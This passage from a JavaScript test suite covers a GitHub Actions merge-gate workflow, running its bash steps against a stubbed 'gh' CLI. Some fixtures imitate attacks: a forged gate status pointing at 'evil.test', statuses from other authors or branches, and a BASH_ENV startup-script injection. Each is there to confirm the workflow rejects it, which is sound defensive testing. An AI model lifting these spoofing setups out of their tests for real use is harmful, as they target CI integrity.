  assert.equal(group(prt("labeled", "needs-owner")), "land-noise-99", "a label other than land/hold cannot cancel or replace the PR's re-gate");
  assert.equal(group(prt("unlabeled", "priority")), "land-noise-99");
  assert.equal(group(prt("labeled", "land")), "land-7");
  assert.equal(group(prt("unlabeled", "hold")), "land-7");
  assert.equal(group(prt("synchronize")), "land-7");
  const wr = (head_branch, prs) => ({ event_name: "workflow_run", run_id: 5, event: { workflow_run: { head_branch, head_sha: "abc123", pull_requests: prs } } });
  assert.equal(group(wr("cursor/x", [{ number: 7 }])), "land-7", "a PR's CI re-gate queues behind that PR's events");
  assert.equal(group(wr(DEPLOY_BRANCH, [])), "land-tip");
  assert.equal(group(wr("fork-branch", [])), "land-sha-abc123", "a CI run naming no PR never shares land-tip");
  assert.equal(ghExpr(LAND.concurrency["cancel-in-progress"], prt("labeled", "land")), true);
  assert.equal(ghExpr(LAND.concurrency["cancel-in-progress"], wr("cursor/x", [{ number: 7 }])), false, "a CI or train re-gate never cancels");
});

test("land.yml write_gate (WP-L3b): AT is whole seconds and a same-second older status no longer blocks the write", () => {
  const resolveRun = LAND.jobs.resolve.steps.find((s) => s.id === "pick").run;
  const atLine = resolveRun.split("\n").find((l) => l.trim().startsWith("at=$("));
  const at = spawnSync("bash", ["-c", `${atLine}; echo "$at"`], { encoding: "utf8" }).stdout.trim();
  assert.equal(new Date(at).toISOString().replace(".000Z", "Z"), at, "ISO-8601 in whole seconds, like created_at");
  const postRun = LAND.jobs.post.steps.find((s) => s.id === "post").run;
  const start = postRun.indexOf("land_run() {");
  const fn = postRun.slice(start, postRun.indexOf("\n}\n", postRun.indexOf("write_gate() {")) + 3);
  const atS = postRun.split("\n").find((l) => l.startsWith("AT_S="));
  const stub = `gh() { local q="" a; case "$*" in *actions/runs/*) echo "$FAKE_RUN"; return 0 ;; esac; while [ $# -gt 0 ]; do a=$1; shift; case "$a" in --method) echo POSTED; return 0 ;; --jq) q=$1; shift ;; esac; done; jq -r "$q" <<<"$FAKE"; }`;
  const LAND_RUN = JSON.stringify({ path: ".github/workflows/land.yml", event: "pull_request_target", head_branch: "cursor/x" });
  const runGate = (created, url, creator = "github-actions[bot]", run = LAND_RUN) => {
    const fake = JSON.stringify(created ? [{ context: "gate", created_at: created, target_url: url, creator: { login: creator } }, { context: "CI", created_at: "2030-01-01T00:00:00Z" }] : []);
    const script = ["set -uo pipefail", `R=o/r; GITHUB_SERVER_URL=https://x; GITHUB_RUN_ID=1; GITHUB_STEP_SUMMARY=/dev/null; DEPLOY_BRANCH=${DEPLOY_BRANCH}`, stub, atS, fn, "write_gate abc123 completed success title summary"].join("\n");
    const r = spawnSync("bash", ["-c", script], { encoding: "utf8", env: { ...process.env, AT: "2026-10-27T10:00:05Z", FAKE: fake, FAKE_RUN: run } });
    assert.equal(r.status, 0, r.stderr);
    return r.stdout.trim().split("\n").at(-1);
  };
  assert.equal(runGate(null), "POSTED", "no gate status yet");
  assert.equal(runGate("2026-10-27T10:00:04Z"), "POSTED", "an older status is replaced");
  assert.equal(runGate("2026-10-27T10:00:05Z"), "POSTED", "same second as AT: the old string compare kept it (`Z` > `.`)");
  assert.notEqual(runGate("2026-10-27T10:00:06Z", "https://x/o/r/actions/runs/2"), "POSTED", "another land.yml run's newer status is kept");
  // A newer status counts only when a land.yml run on the deploy branch posted it as the Actions bot (2026-11-10).
  assert.equal(runGate("2026-10-27T10:00:06Z"), "POSTED", "a newer status naming no run is replaced");
  assert.equal(runGate("2026-10-27T10:00:06Z", "https://x/o/r/actions/runs/2", "someone"), "POSTED", "a newer status by another author is replaced");
  assert.equal(runGate("2026-10-27T10:00:06Z", "https://evil.test/o/r/actions/runs/2"), "POSTED", "a URL off this repository is replaced");
  assert.equal(runGate("2026-10-27T10:00:06Z", "https://x/o/r/actions/runs/2", "github-actions[bot]", JSON.stringify({ path: ".github/workflows/ci.yml", event: "pull_request" })),
    "POSTED", "a newer status from another workflow's run is replaced");
  assert.equal(runGate("2026-10-27T10:00:06Z", "https://x/o/r/actions/runs/2", "github-actions[bot]", JSON.stringify({ path: ".github/workflows/land.yml", event: "workflow_dispatch", head_branch: "cursor/x" })),
    "POSTED", "a land.yml dispatched on another branch is not this workflow's deploy-branch copy");
  assert.equal(runGate("2026-10-27T10:00:06Z", "https://x/o/r/actions/runs/1"), "POSTED",
    "this run's own earlier attempt is replaced (a re-run reuses AT: run 40740152111, #4110)");
});

// ---- the immediate re-gate: a gate passed on a tip that moved is re-dispatched at once, bounded per head ---------

/**
 * Runs one land.yml step script under bash with `gh` stubbed. GH_LOG records each call, a POSTed body as `body <json>`
 * and the token a PUT ran with as `token=<GH_TOKEN>`. Answers: FAKE_PR (or FAKE_PRS by number) for pulls/<n>,
 * FAKE_STATUSES (an array, or an object by sha) for commits/<sha>/statuses, FAKE_RUNS for …/runs?…, FAKE_CHECKS for
 * check-runs, FAKE_LANDS for `gh pr list`, PAUSED for the Dispatch issue, NOW_TIP for the deploy branch; GH_POST_RC
 * fails a POST and GH_PUT_FAIL (PR numbers) fails an update-branch with a 422. `files` are written under the cwd.
 */
function runStep(script, env, files = {}) {
  const stub = [
    `gh() { echo "gh $*" >> "$GH_LOG"; local q="" a data args=("$@");`,
    `  if [ "\${GH_STALL:-}" = true ]; then read -r -t 60 _ <&9; fi;`,
    `  while [ $# -gt 0 ]; do a=$1; shift; case "$a" in --jq) q=$1; shift ;; esac; done;`,
    `  case " \${args[*]} " in`,
    `    *" --method POST "*) case " \${args[*]} " in *" --input "*) echo "body $(jq -c .)" >> "$GH_LOG" ;; esac; return "\${GH_POST_RC:-0}" ;;`,
    `    *" --method PUT "*) echo "token=\${GH_TOKEN:-}" >> "$GH_LOG"`,
    `      case " \${GH_PUT_FAIL:-} " in *" $(sed -n 's#.*/pulls/\\([0-9]*\\)/update-branch.*#\\1#p' <<<"\${args[*]}") "*) echo "gh: merge conflict (HTTP 422)" >&2; return 1 ;; esac`,
    `      echo '{"message":"Updating pull request branch."}'; return 0 ;;`,
    `    *"/issues/"*"/comments"*) data=\${FAKE_COMMENTS:-[]} ;;`,
`    *"/issues"*) if [ "$(grep -c '/issues' "$GH_LOG")" -gt 1 ]; then [ "\${GH_ARM_RECHECK_FAIL:-}" != pause ] || return 31; echo "\${PAUSED_AFTER-\${PAUSED:-false}}"; else echo "\${PAUSED:-false}"; fi; return 0 ;;`,
    `    *"/branches/"*) bc=$(grep -c '/branches/' "$GH_LOG" || true);`,
    `      if [ "$bc" -gt 2 ]; then [ "\${GH_ARM_RECHECK_FAIL:-}" != tip ] || return 31; echo "\${NOW_TIP_AFTER-\${NOW_TIP:-}}";`,
    `      elif [ "$bc" -gt 1 ]; then [ "\${GH_ARM_RECHECK_FAIL:-}" != tip ] || return 31;`,
    `        if [ "$bc" -eq 2 ] && [ "\${GH_CLEAN_PATH:-}" = true ]; then echo "\${NOW_TIP_CLEAN-\${NOW_TIP:-}}";`,
    `        else echo "\${NOW_TIP_AFTER-\${NOW_TIP:-}}"; fi;`,
    `      else echo "\${NOW_TIP:-}"; fi; return 0 ;;`,
    `    *" pr merge "*) echo "merge-token=\${GH_TOKEN:-}" >> "$GH_LOG";`,
    `      if [ "$(grep -c ' pr merge ' "$GH_LOG")" -gt 1 ] && [ -n "\${GH_MERGE_RC2+x}" ]; then`,
    `        [ -z "\${GH_MERGE_STDERR2:-}" ] || printf '%s\\n' "$GH_MERGE_STDERR2" >&2; return "\${GH_MERGE_RC2:-0}";`,
    `      fi;`,
    `      [ -z "\${GH_MERGE_STDERR:-}" ] || printf '%s\\n' "$GH_MERGE_STDERR" >&2; return "\${GH_MERGE_RC:-0}" ;;`,
    `    *" pr list "*) data=\${FAKE_LANDS:-[]} ;;`,
        `    *"/statuses"*) data=$(jq -c --arg h "$(sed -n 's#.*commits/\\([0-9a-f]*\\)/statuses.*#\\1#p' <<<"\${args[*]}")" 'if type == "object" then (.[$h] // []) else . end' <<<"\${FAKE_STATUSES:-[]}") ;;`,
    `    *"/check-runs"*) data=\${FAKE_CHECKS:-'{"check_runs":[]}'} ;;`,
    `    *"/runs?"*) data=\${FAKE_RUNS:-'{"workflow_runs":[]}'} ;;`,
    `    *"/actions/runs/"*) data=\${FAKE_RUN:-'{}'} ;;`,
    `    *) data=\${FAKE_PR:-'{}'}`,
    `       if [[ " \${args[*]} " == *"/pulls/"* ]] && [ "$(grep -c '/pulls/' "$GH_LOG")" -gt 1 ]; then [ "\${GH_ARM_RECHECK_FAIL:-}" != pr ] || return 31; data=\${FAKE_PR_AFTER-$data}; fi`,
    `       if [ -n "\${FAKE_PRS:-}" ]; then data=$(jq -c --arg n "$(sed -n 's#.*/pulls/\\([0-9]*\\).*#\\1#p' <<<"\${args[*]}")" '.[$n] // {}' <<<"$FAKE_PRS"); fi ;;`,
    `  esac`,
    `  if [ -n "$q" ]; then jq -r "$q" <<<"$data"; else echo "$data"; fi; }`,
  ].join("\n");
  const dir = fs.mkdtempSync(path.join(ROOT, "artifacts", "land-step-"));
  const logs = { GH_LOG: path.join(dir, "gh.log"), GITHUB_OUTPUT: path.join(dir, "out"), GITHUB_STEP_SUMMARY: path.join(dir, "summary") };
  for (const f of Object.values(logs)) fs.writeFileSync(f, "");
  for (const [rel, text] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
    fs.writeFileSync(path.join(dir, rel), text);
  }
  const r = spawnSync("bash", ["-c", `${stub}\nexport -f gh\n${script}`], { encoding: "utf8", cwd: dir,
    env: { ...process.env, GH_TOKEN: "fixture-read-token", GITHUB_TOKEN: "fixture-read-token", LAND_TOKEN: "", GITHUB_REPOSITORY: "o/r", GITHUB_SERVER_URL: "https://github.com", GITHUB_RUN_ID: "1", DEPLOY_BRANCH,
      GITHUB_WORKFLOW_REF: `o/r/.github/workflows/land.yml@refs/heads/${DEPLOY_BRANCH}`,
      POST_DEADLINE: String(Math.floor(Date.now() / 1000) + 600), RETRY_MAX: String(LAND.env.RETRY_MAX), ...logs, ...env } });
  const out = Object.fromEntries(fs.readFileSync(logs.GITHUB_OUTPUT, "utf8").split("\n").filter(Boolean).map((l) => [l.slice(0, l.indexOf("=")), l.slice(l.indexOf("=") + 1)]));
  const calls = fs.readFileSync(logs.GH_LOG, "utf8").split("\n").filter(Boolean);
  const summary = fs.readFileSync(logs.GITHUB_STEP_SUMMARY, "utf8");
  fs.rmSync(dir, { recursive: true, force: true });
  return { ...r, out, calls, summary };
}
fs.mkdirSync(path.join(ROOT, "artifacts"), { recursive: true });
const HEAD7 = "a".repeat(40), TIP_A = "b".repeat(40), TIP_B = "c".repeat(40);
// The `gate` arm requires on the head: the success this run (GITHUB_RUN_ID 1) posted, as the Actions bot.
const OWN_GATE = JSON.stringify([{ context: "gate", state: "success", creator: { login: "github-actions[bot]" }, target_url: "https://github.com/o/r/actions/runs/1" }]);
const pr7 = (o = {}) => JSON.stringify({ number: 7, state: "open", draft: false, base: { ref: DEPLOY_BRANCH }, head: { sha: HEAD7 }, auto_merge: null, created_at: "2026-10-27T10:00:00Z", labels: [{ name: "land" }], ...o });

test("land.yml retry: workflow_dispatch on the deploy branch only, in the PR's own group, never cancelling", () => {
  const disp = (ref, pr = "7") => ({ event_name: "workflow_dispatch", ref, run_id: 9, event: { inputs: { pr, head: HEAD7, attempt: "1" } } });
  assert.equal(ghExpr(LAND.jobs.resolve.if, disp(`refs/heads/${DEPLOY_BRANCH}`)), true);
  assert.equal(ghExpr(LAND.jobs.resolve.if, disp("refs/heads/cursor/x")), false, "a dispatch on another ref runs that ref's copy of this file: refused");
  assert.equal(ghExpr(LAND.concurrency.group, disp(`refs/heads/${DEPLOY_BRANCH}`)), "land-7", "queues with the PR's events and CI re-gates");
  assert.equal(ghExpr(LAND.concurrency["cancel-in-progress"], disp(`refs/heads/${DEPLOY_BRANCH}`)), false, "a dispatched re-gate never cancels the PR's CI re-gate");
  assert.ok(Number(LAND.env.RETRY_MAX) >= 1 && Number(LAND.env.RETRY_MAX) <= 5, "a small, finite budget per head");
});

test("land.yml retry job: actions write only, no checkout, no repo code, no secret; runs after post and arm", () => {
  const j = LAND.jobs.retry;
  assert.deepEqual(j.permissions, { actions: "write" });
  assert.deepEqual(j.needs, ["resolve", "post"]);
  assert.equal(runsRepoCode(j), false);
  assert.equal(usesSecret(j), false, "GITHUB_TOKEN: its workflow_dispatch is one of the two events it may start");
  const needs = (post, arm) => ({ needs: { resolve: { result: "success" }, post: { outputs: { retry: post, arm_retry: arm } } } });
  assert.equal(ghExpr(j.if, needs("[]", "")), false);
  assert.equal(ghExpr(j.if, needs("", "")), false, "post skipped");
  assert.equal(ghExpr(j.if, needs('[{"number":7}]', "")), true);
  assert.equal(ghExpr(j.if, needs("[]", '{"number":7}')), true);
  assert.equal(j.steps[0].env.POST_RETRY, "${{ needs.post.outputs.retry }}");
  assert.equal(j.steps[0].env.ARM_RETRY, "${{ needs.post.outputs.arm_retry }}");
  for (const result of ["success", "failure", "skipped"]) {
    const ctx = needs('[{"number":7}]', ""); ctx.needs.post.result = result;
    assert.equal(ghExpr(j.if, ctx), true, `${result}: available post retry survives an arm failure or skip`);
  }

});

test("land.yml post and arm share one no-checkout runner with stage caps and independent retry outputs", () => {
  const j = LAND.jobs.post, post = j.steps.find(s => s.id === "post"), arm = j.steps.find(s => s.id === "arm");
  assert.equal(LAND.jobs.arm, undefined, "no separate arm scheduling boundary");
  assert.equal(j["timeout-minutes"], 13, "old 10-minute post plus 3-minute arm allowance");
  assert.equal(post["timeout-minutes"], 10);
  assert.equal(arm["timeout-minutes"], 3);
  assert.equal(j.steps.find(s => /download-artifact/.test(s.uses || ""))["timeout-minutes"], 10, "artifact download retains its old job's ceiling");
  assert.ok(j.steps.findIndex(s => s.id === "post_budget") < j.steps.findIndex(s => /download-artifact/.test(s.uses || "")));
  assert.equal(post.env.POST_DEADLINE, "${{ steps.post_budget.outputs.deadline }}");
  assert.deepEqual(j.steps.map(s => s.id || "download"), ["post_budget", "download", "post", "arm"]);
  assert.equal(arm.if, "success() && steps.post.outputs.arm != ''");
  assert.equal(arm.env.ARM, "${{ steps.post.outputs.arm }}");
  assert.deepEqual(j.outputs, { arm: "${{ steps.post.outputs.arm }}", retry: "${{ steps.post.outputs.retry }}", arm_retry: "${{ steps.arm.outputs.retry }}" });
  assert.deepEqual(j.permissions, { statuses: "write", checks: "read", contents: "write", "pull-requests": "write", actions: "read", issues: "read" });
  assert.equal(j.env, undefined, "LAND_TOKEN is never job-scoped");
  assert.equal(arm.env.LAND_TOKEN, "${{ secrets.LAND_TOKEN }}");
  assert.equal(runsRepoCode(j), false);
  assert.equal(Number(LAND.env.RETRY_MAX), 3, "the per-head retry budget is unchanged");
});

// Execute both production shell steps with separate processes, as Actions does.
// The production step expression decides whether the second shell may execute.
function postThenArm(postEnv = {}, armEnv = {}, files) {
  const post = LAND.jobs.post.steps.find(s => s.id === "post"), arm = LAND.jobs.post.steps.find(s => s.id === "arm");
  const p = runStep(post.run, postEnv, files);
  const shouldArm = ghExpr(arm.if, { success: p.status === 0, steps: { post: { outputs: { arm: p.out.arm || "" } } } });
  const a = shouldArm ? runStep(arm.run, { GITHUB_TOKEN: "read-token", LAND_TOKEN: "land-token", FAKE_STATUSES: OWN_GATE, ...armEnv, ARM: p.out.arm }) : null;
  return { post: p, arm: a, retry: p.out.retry || "", arm_retry: a?.out.retry || "", result: p.status === 0 && (!a || a.status === 0) ? "success" : "failure" };
}

function postFixture() {
  const line = `= merge-gate passed — open=ok hold=ok plan=ok ci=ok config=ok raise=ok pr=#7 sha=${HEAD7} tip=${TIP_A}`;
  const env = { GH_TOKEN: "read-token", DISARM_TOKEN: "land-token", PRS: JSON.stringify([{ number: 7, head: HEAD7 }]), NOTASKED: "[]", DISARM: "[]",
    PAUSED: "false", AT: "2026-10-27T10:00:05Z", TRUSTED: JSON.stringify([{ number: 7, head: HEAD7, code: 0, line, tip: TIP_A }]),
    NOW_TIP: TIP_A, FAKE_PR: pr7(), FAKE_RUNS: JSON.stringify({ workflow_runs: [{ path: ".github/workflows/ci.yml", check_suite_id: 1 }] }),
    FAKE_CHECKS: JSON.stringify({ check_runs: [{ id: 1, app: { slug: "github-actions" }, check_suite: { id: 1 }, conclusion: "success" }] }) };
  return { env, files: { "verdicts/7.json": JSON.stringify({ number: 7, head: HEAD7, code: 0, line, tip: TIP_A, out: "rows" }) } };
}

test("land.yml combined steps: failed post or rejected status write cannot arm", () => {
  const { env, files } = postFixture();
  const missing = { ...env }; delete missing.PAUSED;
  let r = postThenArm(missing, {}, files);
  assert.notEqual(r.post.status, 0, r.post.stderr);
  assert.equal(r.arm, null);
  assert.equal(r.result, "failure");
  assert.equal(ghExpr(LAND.jobs.post.steps.find(s => s.id === "arm").if,
    { success: false, steps: { post: { outputs: { arm: '{"number":7}' } } } }), false, "a failed step's partial candidate never arms");
  r = postThenArm({ ...env, GH_POST_RC: "1" }, {}, files);
  assert.equal(r.arm, null, "status POST failed: no gated head was emitted");
  assert.equal(r.post.out.arm, "");
});

test("land.yml combined steps: live veto and head/tip races survive the removed queue boundary", () => {
  const { env, files } = postFixture();
  for (const changed of [
    { PAUSED: "true" }, { FAKE_PR: pr7({ state: "closed" }) }, { FAKE_PR: pr7({ draft: true }) },
    { FAKE_PR: pr7({ head: { sha: TIP_B } }) }, { FAKE_PR: pr7({ labels: [] }) },
    { FAKE_PR: pr7({ labels: [{ name: "land" }, { name: "hold" }] }) },
  ]) {
    const r = postThenArm(env, { NOW_TIP: TIP_A, FAKE_PR: pr7(), ...changed }, files);
    assert.ok(r.post.out.arm, "post selected the candidate before the state changed");
    assert.equal(r.arm.status, 0, r.arm.stderr);
    assert.equal(r.arm.calls.some(c => c.includes("pr merge ")), false, JSON.stringify(changed));
    assert.equal(r.arm_retry, "", "a veto is not a tip retry");
  }
  const moved = postThenArm(env, { NOW_TIP: TIP_B, FAKE_PR: pr7() }, files);
  assert.deepEqual(JSON.parse(moved.arm_retry), { number: 7, head: HEAD7 });
  assert.equal(moved.arm.calls.some(c => c.includes("pr merge ")), false);
});

test("land.yml combined steps: token fallback, one pinned merge and unknown errors retain terminal outcomes", () => {
  const { env, files } = postFixture();
  for (const token of ["land-token", ""]) {
    const r = postThenArm(env, { NOW_TIP: TIP_A, FAKE_PR: pr7(), LAND_TOKEN: token }, files);
    assert.equal(r.result, "success");
    assert.equal(r.arm.calls.filter(c => c.includes("pr merge ")).length, 1);
    assert.deepEqual(r.arm.calls.filter(c => c.startsWith("gh pr merge ")),
      [`gh pr merge 7 --repo o/r --auto --merge --match-head-commit ${HEAD7}`]);
    assert.deepEqual(r.arm.calls.filter(c => c.startsWith("merge-token=")), [`merge-token=${token || "read-token"}`]);
    const warning = token ? "" : "::warning::a merge made by GITHUB_TOKEN will not start pages.yml; set LAND_TOKEN, see .claude/skills/steward/references/vendors.md\n";
    assert.equal(r.arm.stdout, `${warning}\narmed (or merged) #7 @ ${HEAD7.slice(0, 12)} onto ${TIP_A.slice(0, 12)} with ${token ? "LAND_TOKEN" : "GITHUB_TOKEN"}\n`);
  }
  const failed = postThenArm(env, { NOW_TIP: TIP_A, FAKE_PR: pr7(), GH_MERGE_RC: "17", GH_MERGE_STDERR: "unknown merge failure" }, files);
  assert.equal(failed.result, "failure");
  assert.equal(failed.arm.status, 17);
  assert.equal(failed.arm.stderr, "unknown merge failure\n");
  assert.equal(failed.arm_retry, "");
  assert.equal(failed.arm.calls.filter(c => c.includes("pr merge ")).length, 1);
});

test("land.yml post phase: one deadline includes download, expires closed and preserves core failure status", () => {
  const job = LAND.jobs.post, budget = job.steps.find(s => s.id === "post_budget"), post = job.steps.find(s => s.id === "post");
  const before = Math.floor(Date.now() / 1000);
  const clock = runStep(budget.run, {});
  const after = Math.floor(Date.now() / 1000);
  assert.equal(clock.status, 0, clock.stderr);
  assert.ok(Number(clock.out.deadline) >= before + 600 && Number(clock.out.deadline) <= after + 600);
  assert.equal(clock.calls.length, 0, "trusted budget clock needs no API or repo code");
  const { env, files } = postFixture();
  for (const [deadline, status] of [[String(before - 1), 124], ["invalid", 1], ["", 1]]) {
    const r = postThenArm({ ...env, POST_DEADLINE: deadline }, {}, files);
    assert.equal(r.post.status, status, r.post.stderr);
    assert.equal(r.post.calls.length, 0, "expired or invalid phase budget cannot post or arm");
    assert.equal(r.arm, null);
    assert.equal(r.retry, "");
  }
  const core = post.run.split("<<'LAND_POST'\n")[1].split("\nLAND_POST")[0];
  const failedEnv = { ...env, TRUSTED: "malformed" };
  const original = runStep("set -e -o pipefail\n" + core, failedEnv, files);
  const wrapped = runStep(post.run, failedEnv, files);
  assert.notEqual(original.status, 0, "jq fails in the original Actions Bash failure mode");
  assert.equal(wrapped.status, original.status, "the envelope preserves the core's exact non-timeout status");
  assert.deepEqual(wrapped.out, original.out, "the envelope preserves file-command outputs on failure");
  assert.ok(wrapped.stderr.length > 0, "core diagnostics remain visible");
});

test("land.yml post phase: timeout stops blocked API work without arming and does not re-source BASH_ENV", () => {
  const post = LAND.jobs.post.steps.find(s => s.id === "post"), { env, files } = postFixture();
  const r = runStep(`mkfifo wait; exec 9<>wait\nexport POST_DEADLINE=$(( $(date -u +%s) + 4 ))\n${post.run}`,
    { ...env, GH_STALL: "true" }, files);
  assert.equal(r.status, 124, r.stderr);
  assert.ok(r.calls.length > 0, "the real timeout interrupted a started API call");
  assert.equal(r.out.arm, undefined);
  assert.equal(r.calls.some(c => c.includes("pr merge ")), false);
  const clean = runStep(`export BASH_ENV="$PWD/startup.sh"\n${post.run}`, env,
    { ...files, "startup.sh": 'echo "unexpected second startup" >> "$GH_LOG"' });
  assert.equal(clean.status, 0, clean.stderr);
  assert.deepEqual(JSON.parse(clean.out.arm), { number: 7, head: HEAD7, tip: TIP_A });
  assert.equal(clean.calls.filter(c => c === "unexpected second startup").length, 0);
});

test("land.yml combined outputs: retries survive a skipped or failed arm and stay deduplicated and bounded", () => {
  const { env, files } = postFixture();
  const retry = r => runStep(LAND.jobs.retry.steps[0].run, { ATTEMPT: "0", POST_RETRY: r.retry, ARM_RETRY: r.arm_retry });
  let combined = postThenArm(env, { NOW_TIP: TIP_A, NOW_TIP_AFTER: TIP_B, FAKE_PR: pr7(), GH_MERGE_RC: "17",
    GH_MERGE_STDERR: "GraphQL: Base branch was modified. Review and try the merge again. (mergePullRequest)" }, files);
  assert.equal(combined.result, "success", "the known race hands off to re-gating, never repeats merge");
  assert.deepEqual(JSON.parse(combined.arm_retry), { number: 7, head: HEAD7 });
  let dispatched = retry(combined);
  assert.equal(dispatched.status, 0, dispatched.stderr);
  assert.equal(dispatched.calls.filter(c => c.includes("--method POST")).length, 1);
  combined = postThenArm({ ...env, NOW_TIP: TIP_B }, {}, files);
  assert.equal(combined.arm, null, "stale post tip skips arm");
  dispatched = retry(combined);
  assert.equal(dispatched.calls.filter(c => c.includes("--method POST")).length, 1, "post's retry propagates without an arm step");
  combined = postThenArm({ ...env, PRS: JSON.stringify([{ number: 7, head: HEAD7 }, { number: 8, head: TIP_B }]) },
    { NOW_TIP: TIP_A, FAKE_PR: pr7(), GH_MERGE_RC: "17", GH_MERGE_STDERR: "unknown merge failure" }, files);
  assert.equal(combined.result, "failure");
  assert.equal(combined.arm.status, 17);
  assert.deepEqual(JSON.parse(combined.retry), [{ number: 8, head: TIP_B }], "earlier post output survives the later arm failure");
  assert.equal(combined.arm_retry, "");
  dispatched = retry(combined);
  assert.equal(dispatched.calls.filter(c => c.includes("--method POST")).length, 1);
  assert.deepEqual(dispatched.calls.filter(c => c.includes("--method POST")),
    [`gh api --method POST repos/o/r/actions/workflows/land.yml/dispatches -f ref=${DEPLOY_BRANCH} -f inputs[pr]=8 -f inputs[head]=${TIP_B} -f inputs[attempt]=1`],
    "the retry still reaches the API despite failed arm");
});

test("land.yml arm: a tip that moved is the ONLY skip handed to retry; any other veto is not", () => {
  const run = LAND.jobs.post.steps.find((s) => s.id === "arm").run;
  const ARM = JSON.stringify({ number: 7, head: HEAD7, tip: TIP_A });
  const go = (pr, now, extra = {}) => runStep(run, { ARM, FAKE_PR: pr, NOW_TIP: now, LAND_TOKEN: "", GITHUB_TOKEN: "t", FAKE_STATUSES: OWN_GATE, ...extra });
  let r = go(pr7(), TIP_B);
  assert.equal(r.status, 0, r.stderr);
  assert.deepEqual(JSON.parse(r.out.retry), { number: 7, head: HEAD7 });
  assert.ok(!r.calls.some((c) => /pr merge/.test(c)), "never arms onto an ungated tip");
  r = go(pr7({ labels: [{ name: "land" }, { name: "hold" }] }), TIP_B);
  assert.equal(r.status, 0, r.stderr);
  assert.equal(r.out.retry, undefined, "`hold` set: no re-gate");
  r = go(pr7({ head: { sha: "d".repeat(40) } }), TIP_B);
  assert.equal(r.out.retry, undefined, "head moved: its push re-gates");
  r = go(pr7(), TIP_A);
  assert.equal(r.out.retry, undefined);
  assert.ok(r.calls.some((c) => c.includes(`pr merge 7 --repo o/r --auto --merge --match-head-commit ${HEAD7}`)), "same tip: arms as before");
  // 2026-11-10: the newest `gate` on the head must be this run's own success, and this run the deploy branch's land.yml.
  for (const [extra, why] of [
    [{ FAKE_STATUSES: "[]" }, "no gate status"],
    [{ FAKE_STATUSES: JSON.stringify([{ context: "gate", state: "success", creator: { login: "someone" }, target_url: "https://github.com/o/r/actions/runs/1" }]) }, "a success by another author"],
    [{ FAKE_STATUSES: JSON.stringify([{ context: "gate", state: "success", creator: { login: "github-actions[bot]" }, target_url: "https://github.com/o/r/actions/runs/2" }]) }, "another run's success"],
    [{ FAKE_STATUSES: JSON.stringify([{ context: "gate", state: "pending", creator: { login: "github-actions[bot]" }, target_url: "https://github.com/o/r/actions/runs/1" }]) }, "this run's status, not a success"],
    [{ GITHUB_WORKFLOW_REF: "o/r/.github/workflows/land.yml@refs/heads/cursor/x" }, "a land.yml from another branch"],
  ]) {
    r = go(pr7(), TIP_A, extra);
    assert.equal(r.status, 0, r.stderr);
    assert.ok(!r.calls.some((c) => / pr merge /.test(c)), `${why}: never arms`);
    assert.match(r.summary, /not arming #7/, why);
  }
});

test("land.yml arm: only a proven base-modified race re-gates after a failed single merge call", () => {
  const run = LAND.jobs.post.steps.find((s) => s.id === "arm").run;
  const error = "GraphQL: Base branch was modified. Review and try the merge again. (mergePullRequest)";
  const auth = { LAND_TOKEN: "land-token", GITHUB_TOKEN: "read-token" };
  const go = (extra = {}) => runStep(run, {
    ARM: JSON.stringify({ number: 7, head: HEAD7, tip: TIP_A }), FAKE_PR: pr7(), NOW_TIP: TIP_A, FAKE_STATUSES: OWN_GATE,
    NOW_TIP_AFTER: TIP_B, ...auth,
    GH_MERGE_RC: "17", GH_MERGE_STDERR: error, ...extra,
  });
  const singleArm = (r) => assert.equal(r.calls.filter((c) => c.includes("pr merge ")).length, 1, "never retries the merge command");
  let r = go();
  assert.equal(r.status, 0, r.stderr);
  assert.deepEqual(JSON.parse(r.out.retry), { number: 7, head: HEAD7 });
  assert.equal(r.stderr.split("\n")[0], error, "original failure stays visible verbatim");
  assert.equal(r.summary, `::notice::not armed #7: deploy tip moved during arm ${TIP_A.slice(0, 12)} -> ${TIP_B.slice(0, 12)}; re-gating within the existing retry budget\n`);
  singleArm(r);
  const refusals = [
    { NOW_TIP_AFTER: TIP_A }, { NOW_TIP_AFTER: "" }, { NOW_TIP_AFTER: "invalid" },
    { GH_MERGE_STDERR: "GraphQL: Resource not accessible by integration" },
    { FAKE_PR_AFTER: pr7({ head: { sha: TIP_B } }) }, { FAKE_PR_AFTER: pr7({ draft: true }) },
    { FAKE_PR_AFTER: pr7({ state: "closed" }) }, { FAKE_PR_AFTER: pr7({ base: { ref: "other" } }) },
    { FAKE_PR_AFTER: pr7({ labels: [] }) },
    { FAKE_PR_AFTER: pr7({ labels: [{ name: "land" }, { name: "hold" }] }) },
    { FAKE_PR_AFTER: "malformed" }, { PAUSED_AFTER: "true" }, { PAUSED_AFTER: "" },
    ...["tip", "pr", "pause"].map((GH_ARM_RECHECK_FAIL) => ({ GH_ARM_RECHECK_FAIL })),
  ];
  for (const extra of refusals) {
    r = go(extra);
    assert.equal(r.status, 17, JSON.stringify(extra) + r.stderr);
    assert.equal(r.out.retry, undefined, JSON.stringify(extra));
    assert.equal(r.summary, "", "refusal never claims that the PR was armed");
    assert.equal(r.stderr.split("\n")[0], extra.GH_MERGE_STDERR || error, "original merge error is preserved verbatim");
    singleArm(r);
    if (extra.GH_MERGE_STDERR) assert.equal(r.calls.filter((c) => c.includes("/branches/")).length, 1, "unrelated errors never enter recovery");
  }
  r = go({ GH_MERGE_RC: "0", GH_MERGE_STDERR: "" });
  assert.equal(r.status, 0, r.stderr);
  assert.equal(r.out.retry, undefined);
  assert.equal(r.summary, `armed (or merged) #7 @ ${HEAD7.slice(0, 12)} onto ${TIP_A.slice(0, 12)} with ${auth.LAND_TOKEN ? "LAND_TOKEN" : "GITHUB_TOKEN"}\n`);
  assert.equal(r.calls.filter((c) => c.includes("/branches/")).length, 1, "success has no recovery reads");
  singleArm(r);
});

test("land.yml arm: clean-status auto-merge refusal re-checks vetoes and tip, then one direct --merge", () => {
  const run = LAND.jobs.post.steps.find((s) => s.id === "arm").run;
  const cleanErr = "GraphQL: Pull request Pull request is in clean status (enablePullRequestAutoMerge)";
  const auth = { LAND_TOKEN: "land-token", GITHUB_TOKEN: "read-token" };
  const go = (extra = {}) => runStep(run, {
    ARM: JSON.stringify({ number: 7, head: HEAD7, tip: TIP_A }), FAKE_PR: pr7(), NOW_TIP: TIP_A, FAKE_STATUSES: OWN_GATE,
    GH_MERGE_RC: "1", GH_MERGE_STDERR: cleanErr, GH_MERGE_RC2: "0", GH_MERGE_STDERR2: "", GH_CLEAN_PATH: "true",
    ...auth, ...extra,
  });
  let r = go();
